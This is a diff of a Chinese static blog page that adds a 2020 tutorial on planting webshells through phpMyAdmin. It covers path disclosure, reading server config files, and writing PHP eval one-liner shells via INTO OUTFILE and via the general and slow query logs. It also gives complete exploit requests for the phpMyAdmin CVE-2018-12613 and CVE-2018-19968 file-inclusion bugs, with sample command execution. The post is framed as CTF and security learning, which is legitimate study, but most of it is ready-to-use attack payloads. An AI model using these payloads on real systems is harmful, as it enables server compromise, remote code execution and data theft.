@@ -6,18 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://teaboj.github.io">
-  <title>TeaBo’s 树洞</title>
+  <title>phpMyadmin 写shell几种方法 | TeaBo’s 树洞</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Record">
-<meta property="og:type" content="website">
-<meta property="og:title" content="TeaBo’s 树洞">
-<meta property="og:url" content="https://teaboj.github.io/index.html">
+  <meta name="description" content="phpMyadmin​    phpMyadmin是常用来管理mysql数据库的web管理界面，在CTF和实战中经常会遇到，本文简单介绍一下常见的写shell方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpMyadmin 写shell几种方法">
+<meta property="og:url" content="https://teaboj.github.io/2020/10/05/Phpmyadmin-%E5%86%99shell%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="TeaBo’s 树洞">
-<meta property="og:description" content="Record">
+<meta property="og:description" content="phpMyadmin​    phpMyadmin是常用来管理mysql数据库的web管理界面，在CTF和实战中经常会遇到，本文简单介绍一下常见的写shell方法。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YuQdP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YuXwt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YKupF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YM9N6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YMXPf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YQrJf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YlP6e.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YlyA1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YGhGt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YYIHg.png">
+<meta property="og:image" content="c:%5CUsers%5CMACHENIKE%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201005151225804.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/05/0YwdgA.png">
+<meta property="article:published_time" content="2020-10-05T05:25:41.000Z">
+<meta property="article:modified_time" content="2020-10-05T08:14:53.789Z">
 <meta property="article:author" content="TeaBo">
-<meta property="article:tag" content="web菜狗，Security Learning">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/10/05/0YuQdP.png">
   
     <link rel="alternative" href="/atom.xml" title="TeaBo’s 树洞" type="application/atom+xml">
   
@@ -166,16 +181,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Phpmyadmin-写shell几种方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Phpmyadmin-写shell几种方法" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/05/Phpmyadmin-%E5%86%99shell%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">phpMyadmin 写shell几种方法</a>
+    <h1 class="article-title" itemprop="name">
+      phpMyadmin 写shell几种方法
     </h1>
   
 
@@ -188,8 +201,137 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="phpMyadmin"><a href="#phpMyadmin" class="headerlink" title="phpMyadmin"></a>phpMyadmin</h1><p>​    phpMyadmin是常用来管理mysql数据库的web管理界面，在CTF和实战中经常会遇到，本文简单介绍一下常见的写shell方法。
-        
+        <h1 id="phpMyadmin"><a href="#phpMyadmin" class="headerlink" title="phpMyadmin"></a>phpMyadmin</h1><p>​    phpMyadmin是常用来管理mysql数据库的web管理界面，在CTF和实战中经常会遇到，本文简单介绍一下常见的写shell方法。<a id="more"></a></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>​    写shell需要绝对物理路径</p>
+<ul>
+<li><p>​    报错爆路径</p>
+<p>直接在URL后面加单引号。要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</p>
+<p><code>[www.abc.com/index.php?id=1](http://www.abc.com/index.php?id=1)&#39;</code></p>
+<p>错误参数值爆路径：尝试将要提交的参数值改成错误值。</p>
+<p><code>[www.abc.com/index.php?id=-1](http://www.abc.com/index.php?id=-1)</code></p>
+<p>Nginx文件类型错误解析爆路径：要求Web服务器是Nginx，且存在文件类型解析漏洞。在图片地址后添加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。</p>
+<p><code>[www.abc.com/bg.jpg/x.php](http://www.abc.com/bg.jpg/x.php)</code></p>
+</li>
+</ul>
+<ul>
+<li><p>直接查询</p>
+<p>sql语句查询</p>
+<p><code>select @@datadir;</code></p>
+</li>
+</ul>
+<p>  或者在变量中搜索<code>log</code></p>
+<ul>
+<li><p>配置文件</p>
+<p>如果注入点有文件读取权限，可通过load_file尝试读取配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line"> c:\windows\php.ini                             # php配置文件</span><br><span class="line"> c:\windows\system32\inetsrv\MetaBase.xml       # IIS虚拟主机配置文件</span><br><span class="line">  # Linux</span><br><span class="line"> &#x2F;etc&#x2F;php.ini                                   # php配置文件</span><br><span class="line"> &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line"> &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf                     # Apache配置文件</span><br><span class="line"> &#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line"> &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line"> &#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf # 虚拟目录配置文件</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>Google大法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com warning</span><br><span class="line">site:xxx.com “fatal error”</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li>查询其他信息、爆破、源码泄露、社工等手段</li>
+</ul>
+<h3 id="phpMyadmin写入shell几种方法"><a href="#phpMyadmin写入shell几种方法" class="headerlink" title="phpMyadmin写入shell几种方法"></a>phpMyadmin写入shell几种方法</h3><h4 id="一、select-into-outfile直接写入"><a href="#一、select-into-outfile直接写入" class="headerlink" title="一、select into outfile直接写入"></a>一、select into outfile直接写入</h4><p>首先查看<code>secure_file_priv</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;;  -查询</span><br><span class="line"> -- secure_file_priv&#x3D;NULL,禁止导入导出</span><br><span class="line"> -- secure_file_priv&#x3D;&#39;&#39;,不限制导入导出</span><br><span class="line"> -- secure_file_priv&#x3D;&#x2F;path&#x2F;,只能向指定目录导入导出</span><br><span class="line"></span><br><span class="line">select load_file(&#39;c:&#x2F;phpinfo.php&#39;);        -- 读取文件</span><br><span class="line">select &#39;123&#39; into outfile &#39;c:&#x2F;shell.php&#39;;  -- 写入文件</span><br></pre></td></tr></table></figure>
+
+<p>直接写入shell</p>
+<p><code>select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;D:/phpstudy_pro/WWW/shell.php&#39;;</code></p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YuQdP.png" alt="0YuQdP.png"></p>
+<h4 id="二、创建数据库和表写入webshell"><a href="#二、创建数据库和表写入webshell" class="headerlink" title="二、创建数据库和表写入webshell"></a>二、创建数据库和表写入webshell</h4><p>同样需要root权限、绝对路径和写入权限</p>
+<p>执行下列对表操作语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE test1( id text(500) not null);</span><br><span class="line">    INSERT INTO test1 (id) VALUES(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);</span><br><span class="line">    SELECT id FROM test1 INTO OUTFILE &#39;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;111.php&#39;;</span><br><span class="line">    DROP TABLE IF EXISTS test1;</span><br></pre></td></tr></table></figure>
+
+<p>分别是建表 写入 写出 和删表。</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YuXwt.png" alt="0YuXwt.png"></p>
+<p>蚁剑连接</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YKupF.png" alt="0YKupF.png"></p>
+<h4 id="三、全局日志getshell"><a href="#三、全局日志getshell" class="headerlink" title="三、全局日志getshell"></a>三、全局日志getshell</h4><p>利用条件出了上面的基础，还需要查看mysql全局日志的配置。</p>
+<p><code>show variables like &#39;%general%&#39;;</code></p>
+<p>如果general_log的值为OFF，那么日志就没有被记录进去，通过下面的语句开启全局日志：</p>
+<p>通过set设置它的值</p>
+<p><code>set global general_log = on;</code></p>
+<p>设置日志目录为绝对路径下的木马文件</p>
+<p><code>set global general_log_file = &#39;D:/phpstudy_pro/WWW/1.php&#39;</code></p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YM9N6.png" alt="0YM9N6.png"></p>
+<p>然后select查询</p>
+<p><code>select &#39;&lt;?php eval($_POST[&quot;T&quot;]);?&gt;&#39;;</code></p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YMXPf.png" alt="0YMXPf.png"></p>
+<p>成功写入日志文件</p>
+<h4 id="四、慢日志查询getshell"><a href="#四、慢日志查询getshell" class="headerlink" title="四、慢日志查询getshell"></a>四、慢日志查询getshell</h4><p>​    慢查询日志：记录所有执行时间超过long_query_time秒的所有查询或者不使用索引的查询。默认情况下，MySQL数据 库是不开启慢查询日志的，long_query_time的默认值为10（即10秒，通常设置为1秒），即运行10秒以上 的语句是慢查询语句。</p>
+<p>查看慢查询日志的配置</p>
+<p><code>show variables like &#39;%slow%&#39;;</code></p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YQrJf.png" alt="0YQrJf.png"></p>
+<p>开启慢日志查询，并修改日志文件绝对路径和文件名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log&#x3D;ON;   --开启</span><br><span class="line">set global slow_query_log_file &#x3D; &#39;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell_2.php&#39;;  --设置日志文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p>重新查看，修改成功。</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YlP6e.png" alt="0YlP6e.png"></p>
+<p>接下来就是select查询shell写入日志文件，只不过比上面的多了一个sleep()延时</p>
+<p><code>select &#39;&lt;?php @eval($_POST[&quot;Teabo&quot;]);?&gt; &#39; or sleep(11);</code></p>
+<p>延时后，插入成功。</p>
+<p>蚁剑连接</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YlyA1.png" alt="0YlyA1.png"></p>
+<h4 id="五、CVE-2018-12613-文件包含getshell"><a href="#五、CVE-2018-12613-文件包含getshell" class="headerlink" title="五、CVE-2018-12613 文件包含getshell"></a>五、CVE-2018-12613 文件包含getshell</h4><p>​    影响版本：Phpmyadmin 4.8.0/4.8.0.1/4.8.1</p>
+<p>​    这个洞在CTF中很常见</p>
+<p>​    </p>
+<p>​    可以直接文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpMyAdmin-4.8.1&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="利用seesion文件包含getshell"><a href="#利用seesion文件包含getshell" class="headerlink" title="利用seesion文件包含getshell"></a>利用seesion文件包含getshell</h5><p>​    phpmyadmin是默认会把执行的语句，记录在session文件当中的，所以可以包含session文件进行    getshell    </p>
+<p>​    session是cookie中phpMyadmin的值</p>
+<p>​    临时文件一般存放于/tmp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_GET[Teabo]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 然后去包含session文件getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28925&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_a43095368a11321840b26d8ed5faba16&amp;Teabo&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/10/05/0YGhGt.png" alt="0YGhGt.png"></p>
+<p>创建一个马</p>
+<p><code>SELECT &quot;&lt;?php fputs(fopen(&#39;a.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&quot; ;</code></p>
+<p>然后包含sess_YouSession文件，成功在目录下写入a.php</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YYIHg.png" alt="0YYIHg.png"></p>
+<h4 id="插入数据表getshell"><a href="#插入数据表getshell" class="headerlink" title="插入数据表getshell"></a>插入数据表getshell</h4><p>看表哥说还可以插入一句话，然后直接去包含这个表文件 .frm</p>
+<p><img src="C:%5CUsers%5CMACHENIKE%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201005151225804.png" alt="image-20201005151225804"></p>
+<p><code>http://node3.buuoj.cn:28925/index.php?target=db_sql.php%253f/../../../../../../var/lib/mysql/test/table_1.frm</code></p>
+<h4 id="六、CVE-2018-19968-文件包含"><a href="#六、CVE-2018-19968-文件包含" class="headerlink" title="六、CVE-2018-19968 文件包含"></a>六、CVE-2018-19968 文件包含</h4><p>影响环境： 4.8.0~4.8.3</p>
+<p>利用条件：攻击者必须能够访问phpMyAdmin配置存储表，尽管可以在攻击者访问的任何数据库中轻松创建这些表。但攻击者必须拥有有效的凭据才能登录phpMyAdmin，所以此漏洞不允许攻击者绕过登录系统。</p>
+<p>漏洞细节：Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段 ‘Filename’，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。</p>
+<p>通常情况下Transformation的规则存储在每个数据库的<strong>pmacolumn_info 表中，而在phpMyAdmin 4.0.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。在tbl_replace.php文件中拼接到$filename的变量filename的变量mime_map$column_name来自于数据表pmacolumn_info中的input_transformation字段</strong>，因为数据库中的内容用户可控，从而产生了任意文件包含漏洞。</p>
+<p>在线环境：<a href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1" target="_blank" rel="noopener">https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1</a></p>
+<p>利用步骤：</p>
+<ol>
+<li><strong>默认密码 root/toor进入phpMyadmin</strong></li>
+</ol>
+<ol start="2">
+<li><strong>创建数据库，并将shell写入session文件</strong></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE foo;</span><br><span class="line">CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );</span><br><span class="line">INSERT INTO foo.bar SELECT &#39;&lt;?php phpinfo(); eval($_GET[Teabo]) ?&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.<strong>访问</strong> <code>http://fc85f05ebe56d4b252731912036b304d.n1.vsgo.cloud:15162/chk_rel.php?fixall_pmadb=1&amp;db=foo</code>   生成phpMyadmin的配置表</p>
+<p>4.<strong>将篡改后的Transformation数据插入表pma_columninfo中将sess中的替换成你的会话ID，即COOKIE中phpMyAdmin的值</strong></p>
+<p><code>INSERT INTO pma__column_info SELECT &#39;1&#39;, &#39;foo&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;../../../../../../../../tmp/sess_d1e8b8c86e214c8055bbce99f53b7a0e&#39;,&#39;plop&#39;;</code></p>
+<p>5.<strong>访问</strong>  <code>http://fc85f05ebe56d4b252731912036b304d.n1.vsgo.cloud:14106/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1&amp;Teabo=system(&#39;ls /&#39;);</code></p>
+<p>成功getshell</p>
+<p><img src="https://s1.ax1x.com/2020/10/05/0YwdgA.png" alt="0YwdgA.png"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>​    phpMyadmin还有很多CVE，但是大多都版本过低，还有一些非授权漏洞，像前段时间的/pma 宝塔，剩下的关于phpmyadmin写shell姿势等学习了再记录。</p>
+
       
 
 	
@@ -224,16 +366,24 @@
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/05/Phpmyadmin-%E5%86%99shell%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">展开全文 >></a>
-        </p>
-      
 
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2020/09/27/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-Web-WriteUp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">巅峰极客2020 Web部分Wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -248,457 +398,32 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-巅峰极客2020-Web-WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/27/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-Web-WriteUp/">巅峰极客2020 Web部分Wp</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/27/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-Web-WriteUp/" class="archive-article-date">
-  	<time datetime="2020-09-27T02:30:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>(●’◡’●)(●’◡’●)(●’◡’●)
-        
-      
-
-	
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">巅峰极客</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/27/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-Web-WriteUp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpMyadmin"><span class="toc-number">1.</span> <span class="toc-text">phpMyadmin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">1.0.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyadmin写入shell几种方法"><span class="toc-number">1.0.2.</span> <span class="toc-text">phpMyadmin写入shell几种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一、select-into-outfile直接写入"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">一、select into outfile直接写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、创建数据库和表写入webshell"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">二、创建数据库和表写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、全局日志getshell"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">三、全局日志getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四、慢日志查询getshell"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">四、慢日志查询getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#五、CVE-2018-12613-文件包含getshell"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">五、CVE-2018-12613 文件包含getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用seesion文件包含getshell"><span class="toc-number">1.0.2.5.1.</span> <span class="toc-text">利用seesion文件包含getshell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#插入数据表getshell"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">插入数据表getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#六、CVE-2018-19968-文件包含"><span class="toc-number">1.0.2.7.</span> <span class="toc-text">六、CVE-2018-19968 文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.0.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写在最后"><span class="toc-number">1.0.4.</span> <span class="toc-text">写在最后</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
   
-    <article id="post-新的开始" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/12/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/">新的开始</a>
-    </h1>
   
 
-        
-        <a href="/2020/09/12/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/" class="archive-article-date">
-  	<time datetime="2020-09-12T11:51:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​    好久不写了，因为这几个月没什么状态（自己这么菜，也没什么可以写的。
-        
-      
-
-	
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/12/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-端午节快乐" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/24/%E7%AB%AF%E5%8D%88%E8%8A%82%E5%BF%AB%E4%B9%90/">端午节快乐</a>
-    </h1>
   
 
-        
-        <a href="/2020/06/24/%E7%AB%AF%E5%8D%88%E8%8A%82%E5%BF%AB%E4%B9%90/" class="archive-article-date">
-  	<time datetime="2020-06-24T14:15:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​    好酒沈醉酬佳节,十分酒,一分歌。</p>
-<p>​    祝各位长辈,同学,师傅们端午节快乐！
-        
-      
-
-	
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/24/%E7%AB%AF%E5%8D%88%E8%8A%82%E5%BF%AB%E4%B9%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-第五空间智能安全大赛WEB部分writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWEB%E9%83%A8%E5%88%86writeup/">第五空间部分WEB题解</a>
-    </h1>
   
 
-        
-        <a href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWEB%E9%83%A8%E5%88%86writeup/" class="archive-article-date">
-  	<time datetime="2020-06-24T12:40:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h5 id="一天只签了2题WEB的到，拖了大佬后腿-菜如我-剩下的WEB题看大佬WP慢慢研究再补充。"><a href="#一天只签了2题WEB的到，拖了大佬后腿-菜如我-剩下的WEB题看大佬WP慢慢研究再补充。" class="headerlink" title="一天只签了2题WEB的到，拖了大佬后腿(菜如我),剩下的WEB题看大佬WP慢慢研究再补充。"></a>一天只签了2题WEB的到，拖了大佬后腿(菜如我),剩下的WEB题看大佬WP慢慢研究再补充。
-        
-      
-
-	
-
